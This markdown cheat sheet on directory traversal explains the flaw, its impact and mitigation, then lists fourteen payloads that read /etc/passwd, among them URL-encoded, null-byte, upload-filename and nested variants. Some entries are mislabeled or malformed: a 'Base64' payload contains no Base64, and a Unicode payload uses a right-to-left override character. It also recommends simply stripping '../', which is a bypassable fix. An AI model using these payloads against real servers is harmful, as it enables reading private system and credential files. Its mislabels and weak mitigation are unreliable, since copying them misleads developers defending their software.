# DIRECTORY TRAVERSAL

- A Path traversal attack.
- Occurs when paths are constructed using unsanitized user inputs.
- By controlling path construction, it enables to walk up the filesystem tree and control where files are being read/written.  

On most OSes, there are two special directories: `.` and `..`.  Where `.` is always the present directory and `..` is the parent directory.  

For example, a simple script: take the `GET` parameter `file`, append that to the path `/var/www/sandbox/uploads/`, then read that file and echo it to the page.

#### Impact

- A directory traversal attack allows an attacker to access files and directories stored outside the web root folder by manipulating and exploiting improper file path validations.
- Allow reading any file on the server that the webserver process has permissions to read.
- This could reveal code, DB files, personal information, account details, etc etc.
- In worst case scenario, it may lead to decode execution or even privilege escalation.

- Consider a site that allows to upload and share documents. When sending HTTP multipart file upload, your client passes the filename to the server for processing.
- Inserting Directory traversal payload in this filename may allow to arbitrarily write files on the server.
- Eg. > ../../../../../var/www/public/definitely_not_malicious.php

#### Mitigation

- One of the easiest vulnerabilities to mitigate, though it exists all over.
- Two ways to directly mitigate,
        - Don't allow path separaters `/` and `\` at all, if users shouldn't be able to *read/write/access* files outside the path being specified.
        - Simply strip instances of `../` or `..\` from paths.
- Generate a filename based on the *extension/MIME-type* of the file, an MD5 of the contents, etc.

#### Common Directory Traversal Payloads

1. Basic Traversal Payload
```BASH
../../../../etc/passwd
```
2. Traversal with Multiple Dot-Dot-Slashes
```BASH
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
3. Traversal with URL Encoding
```BASH
..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
4. Double Dot Encoding
```BASH
..%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
5. Unicode Encoding
```BASH
%u202e%u202e%u202e%u202e/etc/passwd
```
6. Path Traversal with Null Byte Injection
```BASH
../../../../etc/passwd%00
```
7. Traversal in Query Parameters
```BASH
/index.php?file=../../../../etc/passwd
```
8. Traversal with Special Characters
```BASH
..%252F..%252F..%252F..%252Fetc%252Fpasswd
```
9. Traversal in Fragment Identifiers
```BASH
/index.php#../../../../etc/passwd
```
10. Traversal with Base64 Encoding
```BASH
..%2f..%2f..%2f..%2f%2e%2e%2fetc%2fpasswd
```
11. (Adv) Nested Traversal
```BASH
../../../../../../../../../var/www/html/../../../../../etc/passwd
```
12. (Adv) Combination with File Upload Vulnerabilities
```BASH
../../../../uploads/../../etc/passwd
```
13. Traversal with Directory Symlinks
```BASH
../../../../symlink_to/etc/passwd
```
14. Traversal with Wildcards
```BASH
../../../../*/*/*/*/etc/passwd
```


---
